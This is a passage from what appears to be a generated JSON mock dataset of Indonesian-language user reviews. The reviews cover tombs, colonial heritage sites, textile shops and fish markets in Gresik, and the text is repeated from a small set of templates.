                "userName": "Neng_Siti_76",
                "rating": 5,
                "text": "Sangat ramai dikunjungi peziarah saat malam Jumat Legi. Parkir bus luar kota cukup luas.",
                "timestamp": "2026-05-27T14:36:35.395Z"
            },
            {
                "id": "r88",
                "merchantId": "m30",
                "userName": "Haji_Sukri_89",
                "rating": 4,
                "text": "Kompleks makam yang sangat rapi, bersih, dan dijaga dengan baik oleh para pengurus yayasan.",
                "timestamp": "2026-05-16T14:36:35.395Z"
            },
            {
                "id": "r89",
                "merchantId": "m30",
                "userName": "Neng_Siti_52",
                "rating": 5,
                "text": "Arsitektur ukiran gapura nisan cagar budaya yang sangat sakral dan bersejarah tinggi.",
                "timestamp": "2026-05-18T14:36:35.396Z"
            },
            {
                "id": "r90",
                "merchantId": "m30",
                "userName": "Warkop_Lover_24",
                "rating": 5,
                "text": "Menyediakan fasilitas wudhu dan toilet yang sangat bersih, membuat peziarah nyaman berlama-lama.",
                "timestamp": "2026-05-17T14:36:35.396Z"
            },
            {
                "id": "r91",
                "merchantId": "m31",
                "userName": "Mak_Jah_27",
                "rating": 4,
                "text": "Kompleks makam yang sangat rapi, bersih, dan dijaga dengan baik oleh para pengurus yayasan.",
                "timestamp": "2026-05-27T14:36:35.396Z"
            },
            {
                "id": "r92",
                "merchantId": "m31",
                "userName": "Haji_Sukri_27",
                "rating": 5,
                "text": "Arsitektur ukiran gapura nisan cagar budaya yang sangat sakral dan bersejarah tinggi.",
                "timestamp": "2026-05-15T14:36:35.396Z"
            },
            {
                "id": "r93",
                "merchantId": "m31",
                "userName": "Neng_Siti_86",
                "rating": 5,
                "text": "Menyediakan fasilitas wudhu dan toilet yang sangat bersih, membuat peziarah nyaman berlama-lama.",
                "timestamp": "2026-05-24T14:36:35.396Z"
            },
            {
                "id": "r94",
                "merchantId": "m32",
                "userName": "Mak_Jah_26",
                "rating": 4,
                "text": "Kompleks makam yang sangat rapi, bersih, dan dijaga dengan baik oleh para pengurus yayasan.",
                "timestamp": "2026-05-19T14:36:35.396Z"
            },
            {
                "id": "r95",
                "merchantId": "m32",
                "userName": "Haji_Sukri_42",
                "rating": 4,
                "text": "Arsitektur ukiran gapura nisan cagar budaya yang sangat sakral dan bersejarah tinggi.",
                "timestamp": "2026-05-28T14:36:35.396Z"
            },
            {
                "id": "r96",
                "merchantId": "m32",
                "userName": "Neng_Siti_29",
                "rating": 5,
                "text": "Menyediakan fasilitas wudhu dan toilet yang sangat bersih, membuat peziarah nyaman berlama-lama.",
                "timestamp": "2026-05-27T14:36:35.396Z"
            },
            {
                "id": "r97",
                "merchantId": "m33",
                "userName": "Mak_Jah_34",
                "rating": 4,
                "text": "Arsitektur ukiran gapura nisan cagar budaya yang sangat sakral dan bersejarah tinggi.",
                "timestamp": "2026-05-22T14:36:35.396Z"
            },
            {
                "id": "r98",
                "merchantId": "m33",
                "userName": "Haji_Sukri_73",
                "rating": 4,
                "text": "Menyediakan fasilitas wudhu dan toilet yang sangat bersih, membuat peziarah nyaman berlama-lama.",
                "timestamp": "2026-05-16T14:36:35.396Z"
            },
            {
                "id": "r99",
                "merchantId": "m33",
                "userName": "Neng_Siti_13",
                "rating": 5,
                "text": "Sangat ramai dikunjungi peziarah saat malam Jumat Legi. Parkir bus luar kota cukup luas.",
                "timestamp": "2026-05-22T14:36:35.396Z"
            },
            {
                "id": "r100",
                "merchantId": "m34",
                "userName": "Haji_Sukri_36",
                "rating": 4,
                "text": "Kompleks makam yang sangat rapi, bersih, dan dijaga dengan baik oleh para pengurus yayasan.",
                "timestamp": "2026-05-23T14:36:35.396Z"
            },
            {
                "id": "r101",
                "merchantId": "m34",
                "userName": "Neng_Siti_33",
                "rating": 4,
                "text": "Arsitektur ukiran gapura nisan cagar budaya yang sangat sakral dan bersejarah tinggi.",
                "timestamp": "2026-05-17T14:36:35.396Z"
            },
            {
                "id": "r102",
                "merchantId": "m34",
                "userName": "Warkop_Lover_79",
                "rating": 5,
                "text": "Menyediakan fasilitas wudhu dan toilet yang sangat bersih, membuat peziarah nyaman berlama-lama.",
                "timestamp": "2026-05-16T14:36:35.396Z"
            },
            {
                "id": "r103",
                "merchantId": "m35",
                "userName": "Haji_Sukri_51",
                "rating": 4,
                "text": "Arsitektur ukiran gapura nisan cagar budaya yang sangat sakral dan bersejarah tinggi.",
                "timestamp": "2026-05-19T14:36:35.396Z"
            },
            {
                "id": "r104",
                "merchantId": "m35",
                "userName": "Neng_Siti_77",
                "rating": 5,
                "text": "Menyediakan fasilitas wudhu dan toilet yang sangat bersih, membuat peziarah nyaman berlama-lama.",
                "timestamp": "2026-05-16T14:36:35.396Z"
            },
            {
                "id": "r105",
                "merchantId": "m35",
                "userName": "Warkop_Lover_98",
                "rating": 4,
                "text": "Sangat ramai dikunjungi peziarah saat malam Jumat Legi. Parkir bus luar kota cukup luas.",
                "timestamp": "2026-05-22T14:36:35.396Z"
            },
            {
                "id": "r106",
                "merchantId": "m36",
                "userName": "Mak_Jah_67",
                "rating": 4,
                "text": "Arsitektur ukiran gapura nisan cagar budaya yang sangat sakral dan bersejarah tinggi.",
                "timestamp": "2026-05-27T14:36:35.396Z"
            },
            {
                "id": "r107",
                "merchantId": "m36",
                "userName": "Haji_Sukri_97",
                "rating": 5,
                "text": "Menyediakan fasilitas wudhu dan toilet yang sangat bersih, membuat peziarah nyaman berlama-lama.",
                "timestamp": "2026-05-18T14:36:35.396Z"
            },
            {
                "id": "r108",
                "merchantId": "m36",
                "userName": "Neng_Siti_81",
                "rating": 4,
                "text": "Sangat ramai dikunjungi peziarah saat malam Jumat Legi. Parkir bus luar kota cukup luas.",
                "timestamp": "2026-05-24T14:36:35.396Z"
            },
            {
                "id": "r109",
                "merchantId": "m37",
                "userName": "Mak_Jah_76",
                "rating": 4,
                "text": "Kompleks makam yang sangat rapi, bersih, dan dijaga dengan baik oleh para pengurus yayasan.",
                "timestamp": "2026-05-17T14:36:35.396Z"
            },
            {
                "id": "r110",
                "merchantId": "m37",
                "userName": "Haji_Sukri_87",
                "rating": 4,
                "text": "Arsitektur ukiran gapura nisan cagar budaya yang sangat sakral dan bersejarah tinggi.",
                "timestamp": "2026-05-25T14:36:35.396Z"
            },
            {
                "id": "r111",
                "merchantId": "m37",
                "userName": "Neng_Siti_52",
                "rating": 4,
                "text": "Menyediakan fasilitas wudhu dan toilet yang sangat bersih, membuat peziarah nyaman berlama-lama.",
                "timestamp": "2026-05-20T14:36:35.396Z"
            },
            {
                "id": "r112",
                "merchantId": "m38",
                "userName": "Haji_Sukri_28",
                "rating": 4,
                "text": "Kompleks makam yang sangat rapi, bersih, dan dijaga dengan baik oleh para pengurus yayasan.",
                "timestamp": "2026-05-21T14:36:35.396Z"
            },
            {
                "id": "r113",
                "merchantId": "m38",
                "userName": "Neng_Siti_56",
                "rating": 5,
                "text": "Arsitektur ukiran gapura nisan cagar budaya yang sangat sakral dan bersejarah tinggi.",
                "timestamp": "2026-05-22T14:36:35.396Z"
            },
            {
                "id": "r114",
                "merchantId": "m38",
                "userName": "Warkop_Lover_62",
                "rating": 4,
                "text": "Menyediakan fasilitas wudhu dan toilet yang sangat bersih, membuat peziarah nyaman berlama-lama.",
                "timestamp": "2026-05-26T14:36:35.396Z"
            },
            {
                "id": "r115",
                "merchantId": "m39",
                "userName": "Cak_Mat_37",
                "rating": 4,
                "text": "Kompleks makam yang sangat rapi, bersih, dan dijaga dengan baik oleh para pengurus yayasan.",
                "timestamp": "2026-05-28T14:36:35.396Z"
            },
            {
                "id": "r116",
                "merchantId": "m39",
                "userName": "Mak_Jah_37",
                "rating": 5,
                "text": "Arsitektur ukiran gapura nisan cagar budaya yang sangat sakral dan bersejarah tinggi.",
                "timestamp": "2026-05-26T14:36:35.396Z"
            },
            {
                "id": "r117",
                "merchantId": "m39",
                "userName": "Haji_Sukri_63",
                "rating": 4,
                "text": "Menyediakan fasilitas wudhu dan toilet yang sangat bersih, membuat peziarah nyaman berlama-lama.",
                "timestamp": "2026-05-28T14:36:35.396Z"
            },
            {
                "id": "r118",
                "merchantId": "m40",
                "userName": "Mak_Jah_92",
                "rating": 4,
                "text": "Kompleks makam yang sangat rapi, bersih, dan dijaga dengan baik oleh para pengurus yayasan.",
                "timestamp": "2026-05-25T14:36:35.396Z"
            },
            {
                "id": "r119",
                "merchantId": "m40",
                "userName": "Haji_Sukri_59",
                "rating": 5,
                "text": "Arsitektur ukiran gapura nisan cagar budaya yang sangat sakral dan bersejarah tinggi.",
                "timestamp": "2026-05-19T14:36:35.396Z"
            },
            {
                "id": "r120",
                "merchantId": "m40",
                "userName": "Neng_Siti_96",
                "rating": 4,
                "text": "Menyediakan fasilitas wudhu dan toilet yang sangat bersih, membuat peziarah nyaman berlama-lama.",
                "timestamp": "2026-05-18T14:36:35.396Z"
            },
            {
                "id": "r121",
                "merchantId": "m41",
                "userName": "Mak_Jah_85",
                "rating": 4,
                "text": "Kompleks makam yang sangat rapi, bersih, dan dijaga dengan baik oleh para pengurus yayasan.",
                "timestamp": "2026-05-27T14:36:35.396Z"
            },
            {
                "id": "r122",
                "merchantId": "m41",
                "userName": "Haji_Sukri_55",
                "rating": 4,
                "text": "Arsitektur ukiran gapura nisan cagar budaya yang sangat sakral dan bersejarah tinggi.",
                "timestamp": "2026-05-19T14:36:35.396Z"
            },
            {
                "id": "r123",
                "merchantId": "m41",
                "userName": "Neng_Siti_94",
                "rating": 4,
                "text": "Menyediakan fasilitas wudhu dan toilet yang sangat bersih, membuat peziarah nyaman berlama-lama.",
                "timestamp": "2026-05-28T14:36:35.396Z"
            },
            {
                "id": "r124",
                "merchantId": "m42",
                "userName": "Mak_Jah_93",
                "rating": 4,
                "text": "Kompleks makam yang sangat rapi, bersih, dan dijaga dengan baik oleh para pengurus yayasan.",
                "timestamp": "2026-05-23T14:36:35.396Z"
            },
            {
                "id": "r125",
                "merchantId": "m42",
                "userName": "Haji_Sukri_16",
                "rating": 5,
                "text": "Arsitektur ukiran gapura nisan cagar budaya yang sangat sakral dan bersejarah tinggi.",
                "timestamp": "2026-05-21T14:36:35.396Z"
            },
            {
                "id": "r126",
                "merchantId": "m42",
                "userName": "Neng_Siti_96",
                "rating": 5,
                "text": "Menyediakan fasilitas wudhu dan toilet yang sangat bersih, membuat peziarah nyaman berlama-lama.",
                "timestamp": "2026-05-28T14:36:35.396Z"
            },
            {
                "id": "r127",
                "merchantId": "m43",
                "userName": "Mak_Jah_98",
                "rating": 4,
                "text": "Kompleks makam yang sangat rapi, bersih, dan dijaga dengan baik oleh para pengurus yayasan.",
                "timestamp": "2026-05-16T14:36:35.396Z"
            },
            {
                "id": "r128",
                "merchantId": "m43",
                "userName": "Haji_Sukri_72",
                "rating": 5,
                "text": "Arsitektur ukiran gapura nisan cagar budaya yang sangat sakral dan bersejarah tinggi.",
                "timestamp": "2026-05-23T14:36:35.396Z"
            },
            {
                "id": "r129",
                "merchantId": "m43",
                "userName": "Neng_Siti_71",
                "rating": 5,
                "text": "Menyediakan fasilitas wudhu dan toilet yang sangat bersih, membuat peziarah nyaman berlama-lama.",
                "timestamp": "2026-05-15T14:36:35.396Z"
            },
            {
                "id": "r130",
                "merchantId": "m44",
                "userName": "Haji_Sukri_23",
                "rating": 4,
                "text": "Eksplorasi lorong loji kolonial Bandar Grissee serasa melompat kembali ke masa lampau.",
                "timestamp": "2026-05-24T14:36:35.396Z"
            },
            {
                "id": "r131",
                "merchantId": "m44",
                "userName": "Neng_Siti_21",
                "rating": 4,
                "text": "Informasi penjelasan pemandu lokal sangat detail dan ramah dalam menerangkan prasasti kuno.",
                "timestamp": "2026-05-24T14:36:35.396Z"
            },
            {
                "id": "r132",
                "merchantId": "m44",
                "userName": "Warkop_Lover_19",
                "rating": 5,
                "text": "Cagar budaya berharga tinggi yang wajib dikunjungi seluruh generasi muda kita.",
                "timestamp": "2026-05-24T14:36:35.396Z"
            },
            {
                "id": "r133",
                "merchantId": "m45",
                "userName": "Haji_Sukri_52",
                "rating": 4,
                "text": "Eksplorasi lorong loji kolonial Bandar Grissee serasa melompat kembali ke masa lampau.",
                "timestamp": "2026-05-17T14:36:35.396Z"
            },
            {
                "id": "r134",
                "merchantId": "m45",
                "userName": "Neng_Siti_85",
                "rating": 4,
                "text": "Informasi penjelasan pemandu lokal sangat detail dan ramah dalam menerangkan prasasti kuno.",
                "timestamp": "2026-05-20T14:36:35.396Z"
            },
            {
                "id": "r135",
                "merchantId": "m45",
                "userName": "Warkop_Lover_49",
                "rating": 5,
                "text": "Cagar budaya berharga tinggi yang wajib dikunjungi seluruh generasi muda kita.",
                "timestamp": "2026-05-18T14:36:35.396Z"
            },
            {
                "id": "r136",
                "merchantId": "m46",
                "userName": "Mak_Jah_12",
                "rating": 4,
                "text": "Rumah antik heritage bergaya indis eropa klasik yang masih sangat kokoh terawat dengan baik.",
                "timestamp": "2026-05-17T14:36:35.396Z"
            },
            {
                "id": "r137",
                "merchantId": "m46",
                "userName": "Haji_Sukri_48",
                "rating": 4,
                "text": "Eksplorasi lorong loji kolonial Bandar Grissee serasa melompat kembali ke masa lampau.",
                "timestamp": "2026-05-26T14:36:35.396Z"
            },
            {
                "id": "r138",
                "merchantId": "m46",
                "userName": "Neng_Siti_78",
                "rating": 5,
                "text": "Informasi penjelasan pemandu lokal sangat detail dan ramah dalam menerangkan prasasti kuno.",
                "timestamp": "2026-05-17T14:36:35.396Z"
            },
            {
                "id": "r139",
                "merchantId": "m47",
                "userName": "Mak_Jah_53",
                "rating": 4,
                "text": "Rumah antik heritage bergaya indis eropa klasik yang masih sangat kokoh terawat dengan baik.",
                "timestamp": "2026-05-19T14:36:35.396Z"
            },
            {
                "id": "r140",
                "merchantId": "m47",
                "userName": "Haji_Sukri_78",
                "rating": 5,
                "text": "Eksplorasi lorong loji kolonial Bandar Grissee serasa melompat kembali ke masa lampau.",
                "timestamp": "2026-05-23T14:36:35.396Z"
            },
            {
                "id": "r141",
                "merchantId": "m47",
                "userName": "Neng_Siti_18",
                "rating": 4,
                "text": "Informasi penjelasan pemandu lokal sangat detail dan ramah dalam menerangkan prasasti kuno.",
                "timestamp": "2026-05-25T14:36:35.396Z"
            },
            {
                "id": "r142",
                "merchantId": "m48",
                "userName": "Mak_Jah_33",
                "rating": 4,
                "text": "Eksplorasi lorong loji kolonial Bandar Grissee serasa melompat kembali ke masa lampau.",
                "timestamp": "2026-05-18T14:36:35.396Z"
            },
            {
                "id": "r143",
                "merchantId": "m48",
                "userName": "Haji_Sukri_20",
                "rating": 5,
                "text": "Informasi penjelasan pemandu lokal sangat detail dan ramah dalam menerangkan prasasti kuno.",
                "timestamp": "2026-05-17T14:36:35.396Z"
            },
            {
                "id": "r144",
                "merchantId": "m48",
                "userName": "Neng_Siti_89",
                "rating": 5,
                "text": "Cagar budaya berharga tinggi yang wajib dikunjungi seluruh generasi muda kita.",
                "timestamp": "2026-05-27T14:36:35.396Z"
            },
            {
                "id": "r145",
                "merchantId": "m49",
                "userName": "Haji_Sukri_47",
                "rating": 4,
                "text": "Eksplorasi lorong loji kolonial Bandar Grissee serasa melompat kembali ke masa lampau.",
                "timestamp": "2026-05-20T14:36:35.396Z"
            },
            {
                "id": "r146",
                "merchantId": "m49",
                "userName": "Neng_Siti_11",
                "rating": 5,
                "text": "Informasi penjelasan pemandu lokal sangat detail dan ramah dalam menerangkan prasasti kuno.",
                "timestamp": "2026-05-27T14:36:35.396Z"
            },
            {
                "id": "r147",
                "merchantId": "m49",
                "userName": "Warkop_Lover_89",
                "rating": 4,
                "text": "Cagar budaya berharga tinggi yang wajib dikunjungi seluruh generasi muda kita.",
                "timestamp": "2026-05-17T14:36:35.396Z"
            },
            {
                "id": "r148",
                "merchantId": "m50",
                "userName": "Haji_Sukri_85",
                "rating": 4,
                "text": "Rumah antik heritage bergaya indis eropa klasik yang masih sangat kokoh terawat dengan baik.",
                "timestamp": "2026-05-18T14:36:35.396Z"
            },
            {
                "id": "r149",
                "merchantId": "m50",
                "userName": "Neng_Siti_38",
                "rating": 5,
                "text": "Eksplorasi lorong loji kolonial Bandar Grissee serasa melompat kembali ke masa lampau.",
                "timestamp": "2026-05-19T14:36:35.396Z"
            },
            {
                "id": "r150",
                "merchantId": "m50",
                "userName": "Warkop_Lover_82",
                "rating": 4,
                "text": "Informasi penjelasan pemandu lokal sangat detail dan ramah dalam menerangkan prasasti kuno.",
                "timestamp": "2026-05-26T14:36:35.396Z"
            },
            {
                "id": "r151",
                "merchantId": "m51",
                "userName": "Mak_Jah_86",
                "rating": 4,
                "text": "Rumah antik heritage bergaya indis eropa klasik yang masih sangat kokoh terawat dengan baik.",
                "timestamp": "2026-05-21T14:36:35.396Z"
            },
            {
                "id": "r152",
                "merchantId": "m51",
                "userName": "Haji_Sukri_57",
                "rating": 5,
                "text": "Eksplorasi lorong loji kolonial Bandar Grissee serasa melompat kembali ke masa lampau.",
                "timestamp": "2026-05-23T14:36:35.396Z"
            },
            {
                "id": "r153",
                "merchantId": "m51",
                "userName": "Neng_Siti_84",
                "rating": 5,
                "text": "Informasi penjelasan pemandu lokal sangat detail dan ramah dalam menerangkan prasasti kuno.",
                "timestamp": "2026-05-14T14:36:35.396Z"
            },
            {
                "id": "r154",
                "merchantId": "m52",
                "userName": "Mak_Jah_51",
                "rating": 4,
                "text": "Eksplorasi lorong loji kolonial Bandar Grissee serasa melompat kembali ke masa lampau.",
                "timestamp": "2026-05-24T14:36:35.396Z"
            },
            {
                "id": "r155",
                "merchantId": "m52",
                "userName": "Haji_Sukri_97",
                "rating": 4,
                "text": "Informasi penjelasan pemandu lokal sangat detail dan ramah dalam menerangkan prasasti kuno.",
                "timestamp": "2026-05-26T14:36:35.396Z"
            },
            {
                "id": "r156",
                "merchantId": "m52",
                "userName": "Neng_Siti_94",
                "rating": 4,
                "text": "Cagar budaya berharga tinggi yang wajib dikunjungi seluruh generasi muda kita.",
                "timestamp": "2026-05-15T14:36:35.396Z"
            },
            {
                "id": "r157",
                "merchantId": "m53",
                "userName": "Haji_Sukri_44",
                "rating": 4,
                "text": "Eksplorasi lorong loji kolonial Bandar Grissee serasa melompat kembali ke masa lampau.",
                "timestamp": "2026-05-24T14:36:35.396Z"
            },
            {
                "id": "r158",
                "merchantId": "m53",
                "userName": "Neng_Siti_84",
                "rating": 4,
                "text": "Informasi penjelasan pemandu lokal sangat detail dan ramah dalam menerangkan prasasti kuno.",
                "timestamp": "2026-05-17T14:36:35.396Z"
            },
            {
                "id": "r159",
                "merchantId": "m53",
                "userName": "Warkop_Lover_31",
                "rating": 4,
                "text": "Cagar budaya berharga tinggi yang wajib dikunjungi seluruh generasi muda kita.",
                "timestamp": "2026-05-28T14:36:35.396Z"
            },
            {
                "id": "r160",
                "merchantId": "m54",
                "userName": "Mak_Jah_10",
                "rating": 4,
                "text": "Rumah antik heritage bergaya indis eropa klasik yang masih sangat kokoh terawat dengan baik.",
                "timestamp": "2026-05-19T14:36:35.396Z"
            },
            {
                "id": "r161",
                "merchantId": "m54",
                "userName": "Haji_Sukri_16",
                "rating": 5,
                "text": "Eksplorasi lorong loji kolonial Bandar Grissee serasa melompat kembali ke masa lampau.",
                "timestamp": "2026-05-28T14:36:35.396Z"
            },
            {
                "id": "r162",
                "merchantId": "m54",
                "userName": "Neng_Siti_87",
                "rating": 4,
                "text": "Informasi penjelasan pemandu lokal sangat detail dan ramah dalam menerangkan prasasti kuno.",
                "timestamp": "2026-05-21T14:36:35.396Z"
            },
            {
                "id": "r163",
                "merchantId": "m55",
                "userName": "Haji_Sukri_35",
                "rating": 4,
                "text": "Eksplorasi lorong loji kolonial Bandar Grissee serasa melompat kembali ke masa lampau.",
                "timestamp": "2026-05-28T14:36:35.396Z"
            },
            {
                "id": "r164",
                "merchantId": "m55",
                "userName": "Neng_Siti_68",
                "rating": 5,
                "text": "Informasi penjelasan pemandu lokal sangat detail dan ramah dalam menerangkan prasasti kuno.",
                "timestamp": "2026-05-18T14:36:35.396Z"
            },
            {
                "id": "r165",
                "merchantId": "m55",
                "userName": "Warkop_Lover_97",
                "rating": 5,
                "text": "Cagar budaya berharga tinggi yang wajib dikunjungi seluruh generasi muda kita.",
                "timestamp": "2026-05-15T14:36:35.396Z"
            },
            {
                "id": "r166",
                "merchantId": "m56",
                "userName": "Mak_Jah_31",
                "rating": 4,
                "text": "Rumah antik heritage bergaya indis eropa klasik yang masih sangat kokoh terawat dengan baik.",
                "timestamp": "2026-05-24T14:36:35.396Z"
            },
            {
                "id": "r167",
                "merchantId": "m56",
                "userName": "Haji_Sukri_21",
                "rating": 4,
                "text": "Eksplorasi lorong loji kolonial Bandar Grissee serasa melompat kembali ke masa lampau.",
                "timestamp": "2026-05-15T14:36:35.396Z"
            },
            {
                "id": "r168",
                "merchantId": "m56",
                "userName": "Neng_Siti_68",
                "rating": 5,
                "text": "Informasi penjelasan pemandu lokal sangat detail dan ramah dalam menerangkan prasasti kuno.",
                "timestamp": "2026-05-21T14:36:35.396Z"
            },
            {
                "id": "r169",
                "merchantId": "m57",
                "userName": "Mak_Jah_19",
                "rating": 4,
                "text": "Rumah antik heritage bergaya indis eropa klasik yang masih sangat kokoh terawat dengan baik.",
                "timestamp": "2026-05-26T14:36:35.396Z"
            },
            {
                "id": "r170",
                "merchantId": "m57",
                "userName": "Haji_Sukri_64",
                "rating": 5,
                "text": "Eksplorasi lorong loji kolonial Bandar Grissee serasa melompat kembali ke masa lampau.",
                "timestamp": "2026-05-28T14:36:35.396Z"
            },
            {
                "id": "r171",
                "merchantId": "m57",
                "userName": "Neng_Siti_28",
                "rating": 5,
                "text": "Informasi penjelasan pemandu lokal sangat detail dan ramah dalam menerangkan prasasti kuno.",
                "timestamp": "2026-05-14T14:36:35.396Z"
            },
            {
                "id": "r172",
                "merchantId": "m58",
                "userName": "Mak_Jah_86",
                "rating": 4,
                "text": "Rumah antik heritage bergaya indis eropa klasik yang masih sangat kokoh terawat dengan baik.",
                "timestamp": "2026-05-25T14:36:35.396Z"
            },
            {
                "id": "r173",
                "merchantId": "m58",
                "userName": "Haji_Sukri_19",
                "rating": 4,
                "text": "Eksplorasi lorong loji kolonial Bandar Grissee serasa melompat kembali ke masa lampau.",
                "timestamp": "2026-05-17T14:36:35.396Z"
            },
            {
                "id": "r174",
                "merchantId": "m58",
                "userName": "Neng_Siti_11",
                "rating": 5,
                "text": "Informasi penjelasan pemandu lokal sangat detail dan ramah dalam menerangkan prasasti kuno.",
                "timestamp": "2026-05-27T14:36:35.396Z"
            },
            {
                "id": "r175",
                "merchantId": "m59",
                "userName": "Mak_Jah_89",
                "rating": 4,
                "text": "Kain tenun sarung bermotif batik goyor ekspor dengan benang sutra super halus dan awet.",
                "timestamp": "2026-05-25T14:36:35.396Z"
            },
            {
                "id": "r176",
                "merchantId": "m59",
                "userName": "Haji_Sukri_97",
                "rating": 4,
                "text": "Pasar lelang ramai dan meriah sekali. Bisa dapat ikan segar ukuran raksasa langsung dari nelayan.",
                "timestamp": "2026-05-27T14:36:35.396Z"
            },
            {
                "id": "r177",
                "merchantId": "m59",
                "userName": "Neng_Siti_72",
                "rating": 5,
                "text": "Toko oleh-oleh paling komplit dengan packing yang rapi. Pelayanannya ramah membantu membawakan ke mobil.",
                "timestamp": "2026-05-20T14:36:35.396Z"
            },
            {
                "id": "r178",
                "merchantId": "m60",
                "userName": "Mak_Jah_80",
                "rating": 4,
                "text": "Kain tenun sarung bermotif batik goyor ekspor dengan benang sutra super halus dan awet.",
                "timestamp": "2026-05-24T14:36:35.396Z"
            },
            {
                "id": "r179",
                "merchantId": "m60",
                "userName": "Haji_Sukri_43",
                "rating": 4,
                "text": "Pasar lelang ramai dan meriah sekali. Bisa dapat ikan segar ukuran raksasa langsung dari nelayan.",
                "timestamp": "2026-05-15T14:36:35.396Z"
            },
            {
                "id": "r180",
                "merchantId": "m60",
                "userName": "Neng_Siti_81",
                "rating": 5,
                "text": "Toko oleh-oleh paling komplit dengan packing yang rapi. Pelayanannya ramah membantu membawakan ke mobil.",
                "timestamp": "2026-05-25T14:36:35.396Z"
            },
            {
                "id": "r181",
                "merchantId": "m61",
                "userName": "Haji_Sukri_58",
                "rating": 4,
                "text": "Pasar lelang ramai dan meriah sekali. Bisa dapat ikan segar ukuran raksasa langsung dari nelayan.",
                "timestamp": "2026-05-27T14:36:35.396Z"
            },
            {
                "id": "r182",
                "merchantId": "m61",
                "userName": "Neng_Siti_17",
                "rating": 5,
                "text": "Toko oleh-oleh paling komplit dengan packing yang rapi. Pelayanannya ramah membantu membawakan ke mobil.",
                "timestamp": "2026-05-15T14:36:35.396Z"
            },
            {
                "id": "r183",
                "merchantId": "m61",
                "userName": "Warkop_Lover_10",
                "rating": 5,
                "text": "Harga pengrajin tangan pertama yang jauh lebih murah dibanding mall besar. Sangat puas belanja!",
                "timestamp": "2026-05-15T14:36:35.396Z"
            },
            {
                "id": "r184",
                "merchantId": "m62",
                "userName": "Mak_Jah_12",
                "rating": 4,
                "text": "Pasar lelang ramai dan meriah sekali. Bisa dapat ikan segar ukuran raksasa langsung dari nelayan.",
                "timestamp": "2026-05-17T14:36:35.396Z"
            },
            {
                "id": "r185",
                "merchantId": "m62",
                "userName": "Haji_Sukri_61",
                "rating": 4,
                "text": "Toko oleh-oleh paling komplit dengan packing yang rapi. Pelayanannya ramah membantu membawakan ke mobil.",
                "timestamp": "2026-05-27T14:36:35.396Z"
            },
            {
                "id": "r186",
                "merchantId": "m62",
                "userName": "Neng_Siti_79",
                "rating": 5,
                "text": "Harga pengrajin tangan pertama yang jauh lebih murah dibanding mall besar. Sangat puas belanja!",
                "timestamp": "2026-05-19T14:36:35.401Z"
            },
            {
                "id": "r187",
                "merchantId": "m63",
                "userName": "Mak_Jah_54",
                "rating": 4,
                "text": "Kain tenun sarung bermotif batik goyor ekspor dengan benang sutra super halus dan awet.",
                "timestamp": "2026-05-25T14:36:35.402Z"
            },
            {
                "id": "r188",
                "merchantId": "m63",
                "userName": "Haji_Sukri_15",
                "rating": 4,
                "text": "Pasar lelang ramai dan meriah sekali. Bisa dapat ikan segar ukuran raksasa langsung dari nelayan.",
                "timestamp": "2026-05-20T14:36:35.402Z"
            },
            {
                "id": "r189",
                "merchantId": "m63",
                "userName": "Neng_Siti_54",
                "rating": 4,
                "text": "Toko oleh-oleh paling komplit dengan packing yang rapi. Pelayanannya ramah membantu membawakan ke mobil.",
                "timestamp": "2026-05-18T14:36:35.402Z"
            },
            {
                "id": "r190",
                "merchantId": "m64",
                "userName": "Mak_Jah_20",
                "rating": 4,
                "text": "Kain tenun sarung bermotif batik goyor ekspor dengan benang sutra super halus dan awet.",
                "timestamp": "2026-05-19T14:36:35.402Z"
            },
            {
                "id": "r191",
                "merchantId": "m64",
                "userName": "Haji_Sukri_43",
                "rating": 4,
                "text": "Pasar lelang ramai dan meriah sekali. Bisa dapat ikan segar ukuran raksasa langsung dari nelayan.",
                "timestamp": "2026-05-20T14:36:35.402Z"
            },
            {
                "id": "r192",
                "merchantId": "m64",
                "userName": "Neng_Siti_31",
                "rating": 5,
                "text": "Toko oleh-oleh paling komplit dengan packing yang rapi. Pelayanannya ramah membantu membawakan ke mobil.",
                "timestamp": "2026-05-14T14:36:35.402Z"
            },
            {
                "id": "r193",
                "merchantId": "m65",
                "userName": "Mak_Jah_81",
                "rating": 4,
                "text": "Kain tenun sarung bermotif batik goyor ekspor dengan benang sutra super halus dan awet.",
                "timestamp": "2026-05-15T14:36:35.402Z"
            },
            {
                "id": "r194",
                "merchantId": "m65",
                "userName": "Haji_Sukri_91",
                "rating": 5,
                "text": "Pasar lelang ramai dan meriah sekali. Bisa dapat ikan segar ukuran raksasa langsung dari nelayan.",
                "timestamp": "2026-05-27T14:36:35.402Z"
            },
            {
                "id": "r195",
                "merchantId": "m65",
                "userName": "Neng_Siti_57",
                "rating": 5,
                "text": "Toko oleh-oleh paling komplit dengan packing yang rapi. Pelayanannya ramah membantu membawakan ke mobil.",
                "timestamp": "2026-05-16T14:36:35.402Z"
            },
            {
                "id": "r196",
                "merchantId": "m66",
                "userName": "Mak_Jah_31",
                "rating": 4,
                "text": "Kain tenun sarung bermotif batik goyor ekspor dengan benang sutra super halus dan awet.",
                "timestamp": "2026-05-19T14:36:35.402Z"
            },
            {
                "id": "r197",
                "merchantId": "m66",
                "userName": "Haji_Sukri_85",
                "rating": 4,
                "text": "Pasar lelang ramai dan meriah sekali. Bisa dapat ikan segar ukuran raksasa langsung dari nelayan.",
                "timestamp": "2026-05-21T14:36:35.402Z"
            },
            {
                "id": "r198",
                "merchantId": "m66",
                "userName": "Neng_Siti_67",
                "rating": 5,
                "text": "Toko oleh-oleh paling komplit dengan packing yang rapi. Pelayanannya ramah membantu membawakan ke mobil.",
                "timestamp": "2026-05-19T14:36:35.402Z"
            },
            {
                "id": "r199",
                "merchantId": "m67",
                "userName": "Haji_Sukri_23",
                "rating": 4,
                "text": "Pasar lelang ramai dan meriah sekali. Bisa dapat ikan segar ukuran raksasa langsung dari nelayan.",
                "timestamp": "2026-05-18T14:36:35.402Z"
            },
            {
                "id": "r200",
                "merchantId": "m67",
                "userName": "Neng_Siti_53",
                "rating": 5,
                "text": "Toko oleh-oleh paling komplit dengan packing yang rapi. Pelayanannya ramah membantu membawakan ke mobil.",
                "timestamp": "2026-05-27T14:36:35.402Z"
            },
            {
                "id": "r201",
                "merchantId": "m67",
                "userName": "Warkop_Lover_45",
                "rating": 5,
                "text": "Harga pengrajin tangan pertama yang jauh lebih murah dibanding mall besar. Sangat puas belanja!",
                "timestamp": "2026-05-15T14:36:35.402Z"
            },
            {
                "id": "r202",
                "merchantId": "m68",
                "userName": "Mak_Jah_92",
                "rating": 4,
                "text": "Kain tenun sarung bermotif batik goyor ekspor dengan benang sutra super halus dan awet.",
